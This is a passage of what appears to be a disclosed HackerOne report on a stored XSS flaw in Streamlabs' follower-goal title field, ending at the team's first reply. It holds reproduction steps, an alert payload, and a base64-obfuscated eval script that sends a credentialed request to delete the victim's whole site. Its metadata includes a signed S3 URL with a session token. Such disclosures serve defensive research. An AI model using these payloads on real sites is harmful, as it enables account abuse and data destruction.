Goto https://streamlabs.com/dashboard#/settings/shared-access and click on `Create Invitation` option\n2. From the menu choose *Administrator* as the role and click on the *Create* button\n3. An invitation link will be generated copy it and open it in the browser where you are log in the attacker's acc.\n\nFrom the Attacker's acc\n4. The page will ask you to confirm the invitation, accept it\n5. Then goto https://streamlabs.com/dashboard#/settings/shared-access\n6. Under *My Access*, click on the hyperlink username. Clicking on the hyperlink should lead you  to  this page https://streamlabs.com/dashboard/act-as/{userId}\n7. Now you have access to the victim's dashboard,then visit this page, https://streamlabs.com/dashboard#/followergoal\n8. Under *Manage Goal* , in the *Title* field . Enter the xss payload \"\u003e\u003cimg src=x onerror=alert()\u003e\n9. Save it and reload the page you should get the xss popup\n\nNow access the same page from vitim's account, https://streamlabs.com/dashboard#/followergoal\nYou should see a popup there too\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\nInstead of just popping a simple alert box we can do more things as I mentioned in report #1048655, like Deleting User's site completely. Suppose the victim removes the attacker acc after some time but the attacker has added this payload (taken from that mentioned report) \n\n\u003cscript\u003eeval(atob(\"dmFyIHhodHRwPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXs0PT10aGlzLnJlYWR5U3RhdGUmJihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGVtbyIpLmlubmVySFRNTD1hbGVydCh0aGlzLnJlc3BvbnNlVGV4dCkpfSx4aHR0cC5vcGVuKCJERUxFVEUiLCJodHRwczovL3N0cmVhbWxhYnMuY29tL2FwaS92Ni9zaXRlL2V2ZXJ5dGhpbmciKSx4aHR0cC53aXRoQ3JlZGVudGlhbHM9ITAseGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbjsiKSx4aHR0cC5zZW5kKCk7\"))\u003c/script\u003e\n\nAs soon as the victim visits the set goal  page settings this payload will execute and will delete the victim's site completely.\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n**Video POC:**\n\n{F1101374}\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n## Impact\n\nAs I have already mentioned the impact in the above that how an attacker can make requests to endpoints like deleting site with the help of some js code and this actions will be performed when the victim visit's the page where we have inputted our payload.\n\n\nThankyou\nRegards\nSudhanshu","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1101374,"file_name":"fLbac4T4VF.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2t4i94khxe7mxlt9h2qshioxrck9?response-content-disposition=attachment%3B%20filename%3D%22fLbac4T4VF.mp4%22%3B%20filename%2A%3DUTF-8%27%27fLbac4T4VF.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR4FQPWNR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T131925Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQCqPrnmIM9wXCdiARyRx5Ax4KzkUTX%2BAA9yp0xp0y3hpwIhAJK%2BGpTIPJ74OaDkXCOQ%2BpTihtprvqS4V5mSUh1y2wU%2FKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy0%2FlqLwuvawX3UvDsq1wNbthFe3Azfq%2BVrGAAwOW8v13OVbNefIJYMQ5kDsdlb5HJ08yM0BsqcWahF7IL7L7TYky4BDMksLsE9wim6VKGfrGDkJ2xqf6UemXKLHJTFQYvHptU%2F3szZKR%2FC8LR7%2B6tRZxpqeGaKto06xRg8SdPXPwQ5CCa3sr9z%2FRmk5muNSDIunhQbQtOQkGLdzMqVk6VVPeOXhqlyzAfgT3e83vUfoaaCwfF%2FmCbKBDohDMfithPIZLVroT9vBesKP4IjDlzzfZIO7DWiMOSLRzcTHppAapAKQrTx1YmME3lbOKb0RTUhLkV7At9vcRO6%2FkbRxqMqOEJXCe%2BVL%2BrE6bHoa9n8eWt30xCcMDYrLw%2BgUNiWBz8a2WpzU2sJrhEjHnblMQuWDILIalYkMM7YJoCj0JDvimbFcx%2F8UVUXt3vpIX5YNFVB51MFFGtDIlsnHK31GKw%2BwfgWXHTLxmfkdgOmVicYoRI3iUQD%2BjUHVCHtG%2FOyyW6Jh5Ak5SkV4EnucCAmKjnYxfYTVHvx%2F2qHha2gE7PzO9S1%2F2RLePd%2FBkPMLWvvWtpXghc8EXbG%2FOcrKChbXt0T0mlkm27MvkNDjxxQNHnexQvh%2FlyuMHSSQOsIkoZOkQVEAyb5lyww%2FNOQiwY6pAGOxBpxoNSZNy2UBY4lVVkbrwne8yRQlwxEU8lrQJyCH4OggAZ%2By54oO2xX0ZphtYPfkO82%2FzIZHhgLijH2QZ577nmbTN71zYTVaaML3DYqRqLSP9C1%2F2P5bqIcLRlJSM4rutBebgnwegaTqBmzBoQRinHGD5EkmFos1mfkXnqKw3NLMPoOGBtwvSmsJGplUQJI0wq%2BrRsXTMf9szojjKVaxpuAeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4a5032737fb3ee16b34705b9473ce8a74a837b1441b03fbf19807a64275238f1","file_size":5480015,"type":"video/mp4"}],"allow_singular_disclosure_at":null,"vote_count":61,"voters":["pizzapower","rootz491","xploiterr","mrmax4o4","th4nu_0x0","bibekshah","remonsec","ali","eren","operat_or","and 51 more..."],"severity":{"rating":"low","score":3.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"high","user_interaction":"required","scope":"changed","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":52462,"asset_type":"URL","asset_identifier":"*.streamlabs.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9990613,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sudi,\n\nThank you for your submission.
